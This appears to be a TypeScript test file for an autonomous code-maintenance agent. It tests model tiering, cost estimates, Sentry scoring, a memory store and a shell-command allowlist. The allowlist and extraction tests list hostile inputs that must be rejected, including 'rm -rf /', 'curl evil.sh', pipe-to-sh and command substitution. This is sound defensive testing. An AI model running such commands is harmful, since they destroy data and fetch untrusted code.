import { describe, test, expect } from 'bun:test'
import { commandAllowed, investigationModel, applyModel, type Config, type RepoCfg } from './config'
import { estimateCost, extractCommand, extractNotes, branchFor } from './hands'
import { scoreSentryIssue } from './senses'
import { openStore, INVESTIGATE_THRESHOLD, MEMORY_CAP } from './store'

const CFG: Config = { intervalMinutes: 15, budgets: { perCycle: 2, perDay: 10 }, urls: [], repos: [] }
const REPO: RepoCfg = { path: '/x', name: 'r', commands: ['bun update', 'bun install', 'bun add'] }

// ---------------------------------------------------------------- model tiering
describe('investigationModel', () => {
  test('routine scores run on the base model', () => {
    expect(investigationModel(CFG, 50)).toBe('sonnet')
    expect(investigationModel(CFG, 84)).toBe('sonnet')
  })
  test('high scores escalate', () => {
    expect(investigationModel(CFG, 85)).toBe('opus')
    expect(investigationModel(CFG, 95)).toBe('opus')
  })
  test('Re-investigate escalates regardless of score', () => {
    expect(investigationModel(CFG, 10, true)).toBe('opus')
  })
  test('legacy pin overrides everything, including escalation', () => {
    expect(investigationModel({ ...CFG, model: 'haiku' }, 95)).toBe('haiku')
    expect(investigationModel({ ...CFG, model: 'haiku' }, 10, true)).toBe('haiku')
  })
  test('custom tiers + threshold', () => {
    const c = { ...CFG, models: { base: 'haiku', escalated: 'sonnet' }, escalateScore: 70 }
    expect(investigationModel(c, 69)).toBe('haiku')
    expect(investigationModel(c, 70)).toBe('sonnet')
  })
  test('partial models config falls back per-field', () => {
    expect(investigationModel({ ...CFG, models: { base: 'haiku' } }, 90)).toBe('opus')
  })
})

describe('applyModel', () => {
  test('defaults to the base tier — never the CLI default', () => {
    expect(applyModel(CFG)).toBe('sonnet')
  })
  test('legacy pin and models.base are honoured', () => {
    expect(applyModel({ ...CFG, model: 'haiku' })).toBe('haiku')
    expect(applyModel({ ...CFG, models: { base: 'haiku' } })).toBe('haiku')
  })
})

// ---------------------------------------------------------------- killed-run cost estimate
describe('estimateCost', () => {
  test('per-tier rates track published pricing ratios (fable:opus:sonnet:haiku ≈ 10:5:3:1)', () => {
    const min3 = 180_000
    expect(estimateCost('haiku', min3)).toBe(0.45)
    expect(estimateCost('sonnet', min3)).toBe(1.35)
    expect(estimateCost('opus', min3)).toBe(2.25)
    expect(estimateCost('fable', min3)).toBe(4.5)
  })
  test('matches full model ids, not just aliases', () => {
    expect(estimateCost('claude-sonnet-4-6', 120_000)).toBe(0.9)
    expect(estimateCost('claude-opus-4-8', 60_000)).toBe(0.75)
  })
  test('unknown model falls back to the TOP rate — over-count, never under', () => {
    expect(estimateCost(undefined, 60_000)).toBe(1.5)
    expect(estimateCost('mystery-model', 60_000)).toBe(1.5)
  })
  test('zero/negative elapsed costs nothing', () => {
    expect(estimateCost('opus', 0)).toBe(0)
    expect(estimateCost('opus', -5)).toBe(0)
  })
})

// ---------------------------------------------------------------- command allowlist (safety-critical)
describe('commandAllowed', () => {
  test('allows allowlisted prefixes with extra args', () => {
    expect(commandAllowed(REPO, 'bun update zod')).toBe(true)
    expect(commandAllowed(REPO, 'bun install')).toBe(true)
    expect(commandAllowed(REPO, '  bun   update   zod ')).toBe(true)
  })
  test('prefix matches on token boundaries only', () => {
    expect(commandAllowed(REPO, 'bun updatex')).toBe(false)
    expect(commandAllowed(REPO, 'bunx update')).toBe(false)
  })
  test('allowlist entry longer than the command never matches', () => {
    expect(commandAllowed({ ...REPO, commands: ['bun update zod'] }, 'bun update')).toBe(false)
  })
  test('rejects every shell-injection vector', () => {
    for (const cmd of [
      'bun update zod && rm -rf /',
      'bun install; curl evil.sh',
      'bun install | sh',
      'bun install $(whoami)',
      'bun install `id`',
      'bun install > /etc/passwd',
      'bun install < /dev/null',
      'bun install\nrm -rf /',
      'bun install\rrm -rf /',
    ]) expect(commandAllowed(REPO, cmd)).toBe(false)
  })
  test('rejects quoting and backslashes (commands run shell-less — quoting is always wrong)', () => {
    expect(commandAllowed(REPO, 'bun add "zod"')).toBe(false)
    expect(commandAllowed(REPO, "bun add 'zod'")).toBe(false)
    expect(commandAllowed(REPO, 'bun add zo\\d')).toBe(false)
  })
  test('deny-by-default: empty/absent allowlist, missing repo, empty command', () => {
    expect(commandAllowed({ path: '/x', name: 'r' }, 'bun install')).toBe(false)
    expect(commandAllowed(undefined, 'bun install')).toBe(false)
    expect(commandAllowed(REPO, '   ')).toBe(false)
  })
})

// ---------------------------------------------------------------- command extraction
describe('extractCommand', () => {
  test('extracts a single command from an sh block', () => {
    expect(extractCommand('x\n```sh\nbun update zod\n```\ny')).toBe('bun update zod')
  })
  test('strips $ prompts and comment/blank lines', () => {
    expect(extractCommand('```bash\n# refresh the lockfile\n\n$ bun install\n```')).toBe('bun install')
  })
  test('refuses multi-command blocks — never run a subset of the evidence', () => {
    expect(extractCommand('```sh\nbun install\nrm -rf /\n```')).toBeNull()
  })
  test('no sh block → null (diff blocks are not commands)', () => {
    expect(extractCommand('```diff\n-a\n+b\n```')).toBeNull()
  })
})

// ---------------------------------------------------------------- sentry judgment
describe('scoreSentryIssue', () => {
  const NOW = 1_750_000_000_000
  const hoursAgo = (h: number) => new Date(NOW - h * 3_600_000).toISOString()
  test('new errors burn hot, fatal hotter', () => {
    expect(scoreSentryIssue({ id: '1', level: 'error', firstSeen: hoursAgo(3) }, NOW)).toBe(82)
    expect(scoreSentryIssue({ id: '1', level: 'fatal', firstSeen: hoursAgo(3) }, NOW)).toBe(92)
  })
  test('unhandled bumps the score', () => {
    expect(scoreSentryIssue({ id: '1', level: 'fatal', firstSeen: hoursAgo(3), isUnhandled: true }, NOW)).toBe(96)
  })
  test('substatus "new" counts as new even with an older firstSeen', () => {
    expect(scoreSentryIssue({ id: '1', level: 'error', substatus: 'new', firstSeen: hoursAgo(100) }, NOW)).toBe(82)
  })
  test('regressions and escalations matter', () => {
    expect(scoreSentryIssue({ id: '1', level: 'error', substatus: 'regressed', firstSeen: hoursAgo(500) }, NOW)).toBe(78)
    expect(scoreSentryIssue({ id: '1', level: 'error', substatus: 'escalating', firstSeen: hoursAgo(500) }, NOW)).toBe(78)
  })
  test('old ongoing noise stays below the investigate threshold (visible, not alarming)', () => {
    expect(scoreSentryIssue({ id: '1', level: 'error', substatus: 'ongoing', firstSeen: hoursAgo(500) }, NOW)).toBeLessThan(INVESTIGATE_THRESHOLD)
  })
  test('new warnings stay below the threshold too', () => {
    expect(scoreSentryIssue({ id: '1', level: 'warning', firstSeen: hoursAgo(3) }, NOW)).toBeLessThan(INVESTIGATE_THRESHOLD)
  })
})

// ---------------------------------------------------------------- branch naming
describe('branchFor', () => {
  test('deterministic, slugged, length-capped', () => {
    expect(branchFor({ id: 7, title: 'PR #20 has merge conflicts — “Added plants”' })).toBe('resident/7-pr-20-has-merge-conflicts-added-plants')
    expect(branchFor({ id: 7, title: 'x'.repeat(100) }).length).toBeLessThanOrEqual('resident/7-'.length + 40)
  })
})

// ---------------------------------------------------------------- store (in-memory)
describe('store', () => {
  const finding = (over: Record<string, unknown> = {}) => ({
    hash: 'h1', sense: 'git', repo: 'r', kind: 'k', title: 't', detail: 'd', score: 60, status: 'queued' as const, ...over,
  })
  test('upsert dedupes by hash and refreshes score/title', () => {
    const s = openStore(':memory:')
    expect(s.upsertFinding(finding())).toBe('new')
    expect(s.upsertFinding(finding({ title: 't2', score: 70 }))).toBe('existing')
    const it = s.items(10)[0]
    expect(it.title).toBe('t2')
    expect(it.score).toBe(70)
    expect(s.items(10).length).toBe(1)
  })
  test('ignored items get promoted to queued when the score crosses the threshold', () => {
    const s = openStore(':memory:')
    s.upsertFinding(finding({ status: 'ignored', score: 20 }))
    s.upsertFinding(finding({ score: INVESTIGATE_THRESHOLD }))
    expect(s.items(10)[0].status).toBe('queued')
  })
  test('ignored items stay ignored below the threshold', () => {
    const s = openStore(':memory:')
    s.upsertFinding(finding({ status: 'ignored', score: 20 }))
    s.upsertFinding(finding({ score: INVESTIGATE_THRESHOLD - 1 }))
    expect(s.items(10)[0].status).toBe('ignored')
  })
  test('queued() orders by score desc and respects the budget limit', () => {
    const s = openStore(':memory:')
    s.upsertFinding(finding({ hash: 'a', score: 60 }))
    s.upsertFinding(finding({ hash: 'b', score: 90 }))
    s.upsertFinding(finding({ hash: 'c', score: 75 }))
    const q = s.queued(2)
    expect(q.map((i) => i.score)).toEqual([90, 75])
  })
  test('update() patches partial fields incl. nulls and escalate semantics', () => {
    const s = openStore(':memory:')
    s.upsertFinding(finding())
    const id = s.items(1)[0].id
    s.update(id, { status: 'queued', escalate: 1, reason: 'fresh look' })
    expect(s.byId(id)!.escalate).toBe(1)
    s.update(id, { status: 'ready', escalate: 0, reason: null })
    const it = s.byId(id)!
    expect(it.escalate).toBe(0)
    expect(it.reason).toBeNull()
  })
  test('daily budget + cost ledger accumulate', () => {
    const s = openStore(':memory:')
    expect(s.usedToday()).toBe(0)
    s.bumpToday(); s.bumpToday()
    expect(s.usedToday()).toBe(2)
    s.addCost(0.5); s.addCost(0.25)
    expect(s.costToday()).toBeCloseTo(0.75)
  })
})

// ---------------------------------------------------------------- memory (the compounding asset)
describe('memory store', () => {
  test('add, newest-first read, repo filtering', () => {
    const s = openStore(':memory:')
    s.addMemory('r1', 'older note', 'investigation')
    s.addMemory('r1', 'newer note', 'human')
    s.addMemory('r2', 'other repo', 'investigation')
    expect(s.memories('r1').map((m) => m.note)).toEqual(['newer note', 'older note'])
    expect(s.memories().length).toBe(3)
  })
  test('dedupes on normalized text and keeps one copy', () => {
    const s = openStore(':memory:')
    expect(s.addMemory('r', 'Lockfile  diffs are  intentional', 'investigation')).toBe('new')
    expect(s.addMemory('r', 'lockfile diffs are intentional', 'human')).toBe('duplicate')
    expect(s.memories('r').length).toBe(1)
  })
  test('caps per-repo memory at MEMORY_CAP by pruning the oldest', () => {
    const s = openStore(':memory:')
    for (let i = 0; i < MEMORY_CAP + 5; i++) s.addMemory('r', 'note ' + i, 'investigation')
    const notes = s.memories('r')
    expect(notes.length).toBe(MEMORY_CAP)
    expect(notes.some((m) => m.note === 'note 0')).toBe(false)
    expect(notes[0].note).toBe('note ' + (MEMORY_CAP + 4))
  })
  test('edit takes human ownership; empty edits are ignored; delete forgets', () => {
    const s = openStore(':memory:')
    s.addMemory('r', 'draft', 'investigation')
    const id = s.memories('r')[0].id
    s.updateMemory(id, '  polished  ')
    expect(s.memories('r')[0].note).toBe('polished')
    expect(s.memories('r')[0].source).toBe('human')
    s.updateMemory(id, '   ')
    expect(s.memories('r')[0].note).toBe('polished')
    s.deleteMemory(id)
    expect(s.memories('r').length).toBe(0)
  })
  test('blank notes and repo-less notes are refused', () => {
    const s = openStore(':memory:')
    expect(s.addMemory('r', '   ', 'human')).toBe('duplicate')
    expect(s.addMemory('', 'note', 'human')).toBe('duplicate')
    expect(s.memories().length).toBe(0)
  })
})

describe('extractNotes', () => {
  test('parses bullet and numbered lines, strips markers', () => {
    const t = '## RISK\nlow\n\n## NOTES FOR NEXT TIME\n- uses bun, never npm\n* lockfile diffs are intentional\n2. CI must stay green\n'
    expect(extractNotes(t)).toEqual(['uses bun, never npm', 'lockfile diffs are intentional', 'CI must stay green'])
  })
  test('caps at 3 notes', () => {
    expect(extractNotes('## NOTES FOR NEXT TIME\n- a\n- b\n- c\n- d')).toEqual(['a', 'b', 'c'])
  })
  test('clips overlong notes — memory rides on every future dig', () => {
    expect(extractNotes('## NOTES FOR NEXT TIME\n- ' + 'x'.repeat(400))[0].length).toBe(300)
  })
  test('"none", prose lines, and a missing section yield nothing', () => {
    expect(extractNotes('## NOTES FOR NEXT TIME\nnone')).toEqual([])
    expect(extractNotes('## NOTES FOR NEXT TIME\n- none')).toEqual([])
    expect(extractNotes('## NOTES FOR NEXT TIME\nThis repo is interesting.')).toEqual([])
    expect(extractNotes('## ROOT CAUSE\nwhatever')).toEqual([])
  })
  test('stops at the next section header', () => {
    expect(extractNotes('## NOTES FOR NEXT TIME\n- keep\n## EXTRA\n- not this')).toEqual(['keep'])
  })
})
